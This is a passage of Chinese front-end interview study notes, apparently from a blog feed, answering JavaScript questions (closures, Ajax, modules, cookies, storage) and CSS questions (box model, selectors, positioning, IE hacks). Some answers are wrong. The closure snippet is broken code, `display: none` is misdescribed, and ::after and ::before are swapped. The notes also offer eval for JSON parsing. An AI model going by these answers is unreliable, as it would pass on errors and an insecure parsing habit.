侦测到的行为。<br>（2）、事件处理机制：IE是事件冒泡、Firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件；<br>（3）、<code>ev.stopPropagation();</code>（旧ie的方法<code>ev.cancelBubble = true;</code>）</p><blockquote><p>（方方-必考）十九、什么是闭包（closure），为什么要用它？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        n += <span class="number">1</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span>  adder = ()</div><div class="line">adder() <span class="comment">// n === 1</span></div><div class="line">adder() <span class="comment">// n === 2</span></div><div class="line"><span class="built_in">console</span>.log(n) <span class="comment">// n is not defined</span></div></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="external">方应航-什么是闭包</a></p><blockquote><p>二十、如何判断一个对象是否属于某个类？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">使用<span class="keyword">instanceof</span> （待完善）</div><div class="line"> <span class="keyword">if</span>(a <span class="keyword">instanceof</span> Person)&#123;</div><div class="line">     alert(<span class="string">'yes'</span>);</div><div class="line"> &#125;</div></pre></td></tr></table></figure><blockquote><p>二十一、new操作符具体干了什么呢?</p></blockquote><p>（1）、创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。<br>（2）、属性和方法被加入到 this 引用的对象中。<br>（3）、新创建的对象由 this 所引用，并且最后隐式的返回 this 。<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var obj  = &#123;&#125;<span class="comment">;</span></div><div class="line">obj.__proto__ = Base.prototype<span class="comment">;</span></div><div class="line">Base.call(obj)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>二十二、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？</p></blockquote><p><code>hasOwnProperty</code></p><p>javaScript中<code>hasOwnProperty</code>函数方法是返回一个布尔值，指出一个对象是否具有指定名称的属性。</p><p>此方法无法检查该对象的原型链中是否具有该属性；该属性必须是对象本身的一个成员。</p><p>使用方法：<br> <code>object.hasOwnProperty(proName)</code><br> 其中参数object是必选项。一个对象的实例。<br> proName是必选项。一个属性名称的字符串值。</p><p>如果 object 具有指定名称的属性，那么JavaScript中<code>hasOwnPropert</code>y函数方法返回 true，反之则返回 false。</p><blockquote><p>二十三、JSON 的了解？</p></blockquote><p> JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。<br> 它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小<br> 如：<code>{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;}</code></p><p> JSON字符串转换为JSON对象:<br> <code>var obj =eval(&#39;(&#39;+ str +&#39;)&#39;);</code><br> <code>var obj = str.parseJSON();</code><br> <code>var obj = JSON.parse(str);</code></p><p> JSON对象转换为JSON字符串：<br> <code>var last=obj.toJSONString();</code><br> <code>var last=JSON.stringify(obj);</code></p><blockquote><p>二十四、js延迟加载的方式有哪些？</p></blockquote><p> defer和async、动态创建DOM方式（用得最多）、按需异步载入js</p><blockquote><p>二十五、Ajax 是什么? 如何创建一个Ajax？</p></blockquote><p>ajax的全称：Asynchronous Javascript And XML。<br>异步传输+js+xml。<br>所谓异步，在这里简单地解释就是：向服务器发送请求的时候，我们不必等待结果，而是可以同时做其他的事情，等到有了结果它自己会根据设定进行后续操作，与此同时，页面是不会发生整页刷新的，提高了用户体验。</p><p> (1)、创建XMLHttpRequest对象,也就是创建一个异步调用对象<br> (2)、创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息<br> (3)、设置响应HTTP请求状态变化的函数<br> (4)、发送HTTP请求<br> (5)、获取异步调用返回的数据<br> (6)、使用JavaScript和DOM实现局部刷新</p><blockquote><p>（方方-必考）二十六、AJAX 手写一下？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">xhr.open(<span class="string">'POST'</span>, <span class="string">'/xxxx'</span>)</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(xhr.responseText)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.send(<span class="string">'a=1&amp;b=2'</span>)</div></pre></td></tr></table></figure><blockquote><p>二十七、javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？</p></blockquote><p> (1)、use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,</p><p> (2)、使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。</p><p> (3)、提高编译器效率，增加运行速度；</p><p> (4)、为未来新版本的Javascript标准化做铺垫。</p><blockquote><p>二十八、Ajax 解决缓存问题？</p></blockquote><p> (1)、在ajax发送请求前加上 <code>anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;)</code>。</p><p> (2)、在ajax发送请求前加上<code>anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;)</code>。</p><p> (3)、在URL后面加上一个随机数： <code>fresh=&quot; + Math.random()</code>;。</p><p> (4)、在URL后面加上时间戳：<code>nowtime=&quot; + new Date().getTime()</code>;。</p><p> (5)、如果是使用jQuery，直接这样就可以了 <code>$.ajaxSetup({cache:false})</code>。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。</p><blockquote><p>二十九、同步和异步的区别?</p></blockquote><p>同步的概念应该是来自于OS中关于同步的概念:不同进程为协同完成某项工作而在先后次序上调整(通过阻塞,唤醒等方式).同步强调的是顺序性.谁先谁后.异步则不存在这种顺序性.</p><p>同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作。</p><p>异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容。</p><blockquote><p>三十、如何解决跨域问题?</p></blockquote><p>jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面</p><blockquote><p>三十一、服务器代理转发时，该如何处理cookie？</p></blockquote><p> nginx</p><blockquote><p>三十二、模块化开发怎么做？</p></blockquote><p><a href="http://benalman.com/news/2010/11/immediately-invoked-function-expression/" target="_blank" rel="external">立即执行函数</a>，不暴露私有成员<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　<span class="keyword">var</span> _count = <span class="number">0</span>;</div><div class="line">　　　　<span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="comment">//...</span></div><div class="line">　　　　&#125;;</div><div class="line">　　　　<span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">　　　　　　<span class="comment">//...</span></div><div class="line">　　　　&#125;;</div><div class="line">　　　　<span class="keyword">return</span> &#123;</div><div class="line">　　　　　　<span class="attr">m1</span> : m1,</div><div class="line">　　　　　　<span class="attr">m2</span> : m2</div><div class="line">　　　　&#125;;</div><div class="line">　　&#125;)();</div></pre></td></tr></table></figure></p><blockquote><p>三十三、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别？</p></blockquote><p><a href="https://github.com/amdjs/amdjs-api/wiki/AMD" target="_blank" rel="external">AMD 规范</a> || <a href="https://github.com/seajs/seajs/issues/242" target="_blank" rel="external">CMD 规范在这里</a><br>区别：</p><p> (1)、对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible.<br> (2)、CMD 推崇依赖就近，AMD 推崇依赖前置。看代码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// CMD</span></div><div class="line"><span class="function"><span class="title">define</span><span class="params">(function(require, exports, module)</span></span>&#123;</div><div class="line">    <span class="selector-tag">var</span> <span class="selector-tag">a</span> = require(<span class="string">'./a'</span>)</div><div class="line">    <span class="selector-tag">a</span>.doSomething()</div><div class="line">    <span class="comment">// 此处略去 100 行</span></div><div class="line">    <span class="selector-tag">var</span> <span class="selector-tag">b</span> = require(<span class="string">'./b'</span>) <span class="comment">// 依赖可以就近书写</span></div><div class="line">    <span class="selector-tag">b</span>.doSomething()</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// AMD 默认推荐</span></div><div class="line"><span class="function"><span class="title">define</span><span class="params">([<span class="string">'./a'</span>, <span class="string">'./b'</span>], function(a, b)</span></span>&#123; <span class="comment">// 依赖必须一开始就写好</span></div><div class="line">    <span class="selector-tag">a</span>.doSomething()</div><div class="line">    <span class="comment">// 此处略去 100 行</span></div><div class="line">    <span class="selector-tag">b</span>.doSomething()</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><blockquote><p>三十四、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何 缓存的？）</p></blockquote><p><a href="http://annn.me/how-to-realize-cmd-loader/" target="_blank" rel="external">详情点我</a></p><blockquote><p>三十五、&gt; 请你谈谈Cookie的弊端</p></blockquote><p><strong>优点</strong>： 极高的扩展性和可用性<br>1) 数据持久性。<br>2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。<br>3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。<br>4) 简单性。 基于文本的轻量结构。<br>5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。<br>6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。<br>7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。<br><!--more--><br><strong>缺点</strong>：<br>1) Cookie 数量和长度的限制 。<br>数量：每个域的 cookie 总数有限。<br>a) IE6 或更低版本最多 20 个 cookie<br>b) IE7 和之后的版本最后可以有 50 个 cookie<br>c) Firefox 最多 50 个 cookie<br>d) chrome 和 Safari 没有做硬性限制<br>长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。<br>2) 潜在的安全风险 。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能取得所有的 session 信息。<br>3) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。<br>4) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p><blockquote><p>三十六、简单说一下浏览器本地存储是怎样的</p></blockquote><p>1)Cookie ： 广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。<br>2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。<br>优点：容量适中，基本上不存在兼容性问题<br>缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。<br>3)Google Gears ： Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。<br>4)User Data ： 是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。<br>（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）<br>（实际测试 2000 （ IE5.5 ）、 XP （ IE6 、 IE7 ）， Vista （ IE7 ）下都是可正常使用。）<br>5)Web Storage<br>在较高版本的浏览器中，JS 提供了 sessionStorage 和 globalStorage 。<br>在 HTML5 中提供了 sessionStorage 和 localStorage 。<br>sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。<br>globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。<br>localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上。<br>优点：容量大、易用、强大、原生支持<br>缺点： a) 兼容性差（ Chrome,  Safari, Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）<br>b) 安全性差（所以请勿使用 localStorage 保存敏感信息）</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;（方方-必考）一、介绍js的基本数据类型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Undefined、Null、Boolean、Number、String、&lt;/code&gt;&lt;br&gt;ECMAScript 2015 新增:&lt;code&gt;Symbol&lt;/code&gt; (创建后独一无二且不可变的数据类型 )&lt;br&gt;一旦出现（数组、函数、正则、日期、NaN）直接0分&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二、介绍js有哪些内置对象？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Object 是 JavaScript 中所有对象的父对象&lt;/p&gt;
&lt;p&gt;数据封装类对象：&lt;code&gt;Object、Array、Boolean、Number 和 String&lt;/code&gt;&lt;br&gt;其他对象：&lt;code&gt;Function、Arguments、Math、Date、RegExp、Error&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/web/wa-objectsinjs-v1b/index.html&quot;&gt;了解 JavaScript 中的内置对象&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSS 查漏补缺</title>
    <link href="wangsiyuan233.github.io/2018/07/04/58CSS-%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/"/>
    <id>wangsiyuan233.github.io/2018/07/04/58CSS-查漏补缺/</id>
    <published>2018-07-05T03:04:34.000Z</published>
    <updated>2018-07-12T00:13:06.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>（方方-必考）一、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？</p></blockquote><p>（1）、有两种， IE 盒子模型、W3C 盒子模型；<br>（2）、盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)；<br>（3）、区  别： IE的content部分把 border 和 padding计算了进去;<br>（4）、content-box: width == 内容区宽度<br>（5）、border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p><blockquote><p>二、CSS选择符有哪些？哪些属性可以继承？</p></blockquote><p>1.id选择器（ <code>#myid</code> ）<br>2.类选择器（ <code>.myclassname</code> ）<br>3.标签选择器（ <code>div, h1, p</code>）<br>4.相邻选择器（<code>h1 + p</code> ）<br>5.子选择器（ <code>ul &gt; li</code> ）<br>6.后代选择器（ <code>li a</code> ）<br>7.通配符选择器（ <code>*</code> ）<br>8.属性选择器（ <code>a[rel = &quot;external&quot;]</code> ）<br>9.伪类选择器（ <code>a:hover, li:nth-child</code> ）</p><p>可继承的样式： <code>font-size font-family color, UL LI DL DD DT</code>;</p><p>不可继承的样式：<code>border padding margin width height</code>;<br><a id="more"></a></p><blockquote><p>三、CSS优先级算法如何计算？</p></blockquote><p>优先级就近原则，同权重情况下样式定义最近者为准;<br>载入样式以最后载入的定位为准;</p><p>优先级为:<br>同权重: 内联样式表（标签内部）&gt; 嵌入样式表（当前文件中）&gt; 外部样式表（外部文件中）。<br>!important &gt;  id &gt; class &gt; tag<br>important 比 内联优先级高</p><blockquote><p>四、CSS3新增伪类有那些？</p></blockquote><p>举例：<br><code>p:first-of-type</code>    选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br><code>p:last-of-type</code>    选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br><code>p:only-of-type</code>    选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br><code>p:only-child</code>        选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br><code>p:nth-child(2)</code>    选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。</p><p><code>::after</code>            在元素之前添加内容,也可以用来做清除浮动。<br><code>::before</code>       在元素之后添加内容<br><code>:enabled</code><br><code>:disabled</code>        控制表单控件的禁用状态。<br><code>:checked</code>       单选框或复选框被选中。</p><blockquote><p>（方方-必考）五、如何居中div？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/03/28/33CSS%E5%B8%83%E5%B1%80%E6%96%B9%E6%A1%88%E4%B9%8Bflex-float/" target="_blank" rel="external">点我到布局</a></p><blockquote><p>六、display有哪些值？说明他们的作用。</p></blockquote><p><code>block</code>           块类型。默认宽度为父元素宽度，可设置宽高，换行显示。<br><code>none</code>           缺省值。象行内元素类型一样显示。<br><code>inline</code>          行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示。<br><code>inline-block</code>    默认宽度为内容宽度，可以设置宽高，同行显示。<br><code>list-item</code>     象块类型元素一样显示，并添加样式列表标记。<br><code>table</code>           此元素会作为块级表格来显示。<br><code>inherit</code>         规定应该从父元素继承 display 属性的值。</p><blockquote><p>七、<code>position</code>的值<code>relative</code>和<code>absolute</code>定位原点是？</p></blockquote><p><code>static</code>   ： 默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right z-index 声明）。<br><code>absolute</code> ： 生成绝对定位的元素，相对于值不为 static的第一个父元素进行定位。<br><code>fixed</code>    ：（老IE不支持）生成绝对定位的元素，相对于浏览器窗口进行定位。<br><code>relative</code> ： 生成相对定位的元素，相对于其正常位置进行定位。<br><code>inherit</code>  ： 规定从父元素继承 position 属性的值。</p><blockquote><p>八、CSS3有哪些新特性？</p></blockquote><p>新增各种CSS选择器    （<code>: not(.input)：所有 class 不是“input”的节点</code>）<br>圆角            （<code>border-radius:8px</code>）<br>多列布局        （<code>multi-column layout</code>）<br>阴影和反射    （<code>Shadow\Reflect</code>）<br>文字特效        （<code>text-shadow</code>）<br>文字渲染        （<code>Text-decoration</code>）<br>线性渐变        （<code>gradient</code>）<br>旋转             （<code>transform</code>）<br>缩放,定位,倾斜,动画,多背景<br>例如:<code>transform:\scale(0.85,0.90)\ translate(0px,-30px)\ skew(-9deg,0deg)\Animation:</code></p><blockquote><p>九、请解释一下CSS3的Flexbox（弹性盒布局模型）,以及适用场景？</p></blockquote><p>一个用于页面布局的全新CSS3功能，Flexbox可以把列表放在同一个方向（从上到下排列，从左到右），并让列表能延伸到占用可用的空间。<br>较为复杂的布局还可以通过嵌套一个伸缩容器（flex container）来实现。<br>采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。<br>它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。<br>常规布局是基于块和内联流方向，而Flex布局是基于flex-flow流可以很方便的用来做局中，能对不同屏幕大小自适应。<br>在布局上有了比以前更加灵活的空间。</p><p><a href="http://www.w3cplus.com/css3/flexbox-basics.html" target="_blank" rel="external">【【Flex布局】】</a></p><blockquote><p>十、 用纯CSS创建一个三角形的原理是什么？</p></blockquote><p>把上、左、右三条边隐藏掉（颜色设为 transparent）<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#demo</span> &#123;</div><div class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">border-width</span>: <span class="number">20px</span>;</div><div class="line">  <span class="attribute">border-style</span>: solid;</div><div class="line">  <span class="attribute">border-color</span>: transparent transparent red transparent;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>十一、 一个满屏 <strong>品</strong> 字布局 如何设计?</p></blockquote><p>简单的方式：<br>  上面的div宽100%，<br>  下面的两个div分别宽50%，<br>  然后用float或者inline使其不换行即可</p><blockquote><p>十二、 css多列等高如何实现？</p></blockquote><p>利用padding-bottom|margin-bottom正负值相抵；<br>设置父容器设置超出隐藏（overflow:hidden），这样子父容器的高度就还是它里面的列没有设定padding-bottom时的高度，<br>当它里面的任 一列高度增加了，则父容器的高度被撑到里面最高那列的高度，<br>其他比这列矮的列会用它们的padding-bottom补偿这部分高度差。</p><blockquote><p>十三、经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧 ？</p></blockquote><p>（1）、png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8.</p><p>（2）、浏览器默认的margin和padding不同。解决方案是加一个全局的<code>*{margin:0;padding:0;}</code>来统一。</p><p>（3）、IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。</p><p>浮动ie产生的双倍距离 <code>#box{ float:left; width:10px; margin:0 0 0 100px;}</code></p><p>这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入 —— <code>_display:inline</code>;将其转化为行内属性。(_这个符号只有ie6会识别)</p><p>渐进识别的方式，从总体中逐渐排除局部。</p><p>首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。<br>接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。</p><p>css<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.bb</span>&#123;</div><div class="line"><span class="attribute">background-color</span>:red;<span class="comment">/*所有识别*/</span></div><div class="line"><span class="attribute">background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>; <span class="comment">/*IE6、7、8识别*/</span></div><div class="line">+<span class="attribute">background-color</span>:<span class="number">#a200ff</span>;<span class="comment">/*IE6、7识别*/</span></div><div class="line">-<span class="attribute">background-color</span>:<span class="number">#1e0bd1</span>;<span class="comment">/*IE6识别*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（4）、IE下,可以使用获取常规属性的方法来获取自定义属性,<br>也可以使用<code>getAttribute()</code>获取自定义属性;<br>Firefox下,只能使用<code>getAttribute()</code>获取自定义属性。<br>解决方法:统一通过<code>getAttribute()</code>获取自定义属性。</p><p>（5）、IE下,even对象有x,y属性,但是没有pageX,pageY属性;<br>Firefox下,event对象有pageX,pageY属性,但是没有x,y属性。<br>解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。</p><p>（6）、Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示,<br>可通过加入 CSS 属性 <code>-webkit-text-size-adjust: none;</code> 解决。</p><p>（7）、超链接访问过后hover样式就不出现了 被点击访问过的超链接样式不在具有hover和active了解决方法是改变CSS属性的排列顺序:<br><code>L-V-H-A :  a:link {} a:visited {} a:hover {} a:active {}</code></p><blockquote><p>十四、li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？</p></blockquote><p>行框的排列会受到中间空白（回车\空格）等的影响，因为空格也属于字符,这些空白也会被应用样式，占据空间，所以会有间隔，把字符大小设为0，就没有空格了。</p><blockquote><p>十五、为什么要初始化CSS样式。</p></blockquote><p>（1）、 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。</p><p>（2）、 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。</p><p>  最简单的初始化方法： <code>* {padding: 0; margin: 0;}</code> （强烈不建议）<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//淘宝的样式初始化代码：</span></div><div class="line">  <span class="selector-tag">body</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>, hr, <span class="selector-tag">p</span>, <span class="selector-tag">blockquote</span>, <span class="selector-tag">dl</span>, <span class="selector-tag">dt</span>, <span class="selector-tag">dd</span>, <span class="selector-tag">ul</span>, <span class="selector-tag">ol</span>, <span class="selector-tag">li</span>, pre, <span class="selector-tag">form</span>, <span class="selector-tag">fieldset</span>, <span class="selector-tag">legend</span>, <span class="selector-tag">button</span>, <span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123; <span class="attribute">margin</span>:<span class="number">0</span>; <span class="attribute">padding</span>:<span class="number">0</span>; &#125;</div><div class="line">  <span class="selector-tag">body</span>, <span class="selector-tag">button</span>, <span class="selector-tag">input</span>, select, <span class="selector-tag">textarea</span> &#123; <span class="attribute">font</span>:<span class="number">12px</span>/<span class="number">1.5</span>tahoma, arial, \<span class="number">5</span>b8b\<span class="number">4</span>f53; &#125;</div><div class="line">  <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, h6&#123; <span class="attribute">font-size</span>:<span class="number">100%</span>; &#125;</div><div class="line">  <span class="selector-tag">address</span>, <span class="selector-tag">cite</span>, <span class="selector-tag">dfn</span>, <span class="selector-tag">em</span>, <span class="selector-tag">var</span> &#123; <span class="attribute">font-style</span>:normal; &#125;</div><div class="line">  <span class="selector-tag">code</span>, <span class="selector-tag">kbd</span>, pre, <span class="selector-tag">samp</span> &#123; <span class="attribute">font-family</span>:couriernew, courier, monospace; &#125;</div><div class="line">  small&#123; <span class="attribute">font-size</span>:<span class="number">12px</span>; &#125;</div><div class="line">  <span class="selector-tag">ul</span>, <span class="selector-tag">ol</span> &#123; <span class="attribute">list-style</span>:none; &#125;</div><div class="line">  <span class="selector-tag">a</span> &#123; <span class="attribute">text-decoration</span>:none; &#125;</div><div class="line">  <span class="selector-tag">a</span>:hover &#123; <span class="attribute">text-decoration</span>:underline; &#125;</div><div class="line">  <span class="selector-tag">sup</span> &#123; <span class="attribute">vertical-align</span>:text-top; &#125;</div><div class="line">  sub&#123; <span class="attribute">vertical-align</span>:text-bottom; &#125;</div><div class="line">  <span class="selector-tag">legend</span> &#123; <span class="attribute">color</span>:<span class="number">#000</span>; &#125;</div><div class="line">  <span class="selector-tag">fieldset</span>, <span class="selector-tag">img</span> &#123; <span class="attribute">border</span>:<span class="number">0</span>; &#125;</div><div class="line">  <span class="selector-tag">button</span>, <span class="selector-tag">input</span>, select, <span class="selector-tag">textarea</span> &#123; <span class="attribute">font-size</span>:<span class="number">100%</span>; &#125;</div><div class="line">  <span class="selector-tag">table</span> &#123; <span class="attribute">border-collapse</span>:collapse; <span class="attribute">border-spacing</span>:<span class="number">0</span>; &#125;</div></pre></td></tr></table></figure></p><blockquote><p>十六、absolute的containing block(容器块)计算方式跟正常流有什么不同？</p></blockquote><p>无论属于哪种，都要先找到其祖先元素中最近的 <code>position</code> 值不为 <code>static</code> 的元素，然后再判断：<br>（1）、若此元素为 <code>inline</code> 元素，则 <code>containing block</code> 为能够包含这个元素生成的第一个和最后一个 <code>inline box</code> 的 <code>padding box</code> (除 margin, border 外的区域) 的最小矩形；<br>（2）、否则,则由这个祖先元素的 <code>padding box</code> 构成。<br>如果都找不到，则为 <code>initial containing block</code>。</p><p>补充：</p><ol><li><code>static</code>(默认的)/<code>relative</code>：简单说就是它的父元素的内容框（即去掉padding的部分）</li><li><code>absolute</code>: 向上找最近的定位为absolute/relative的元素</li><li><code>fixed</code>: 它的<code>containing block</code>一律为根元素(html/body)，根元素也是initial containing block<blockquote><p>十七、 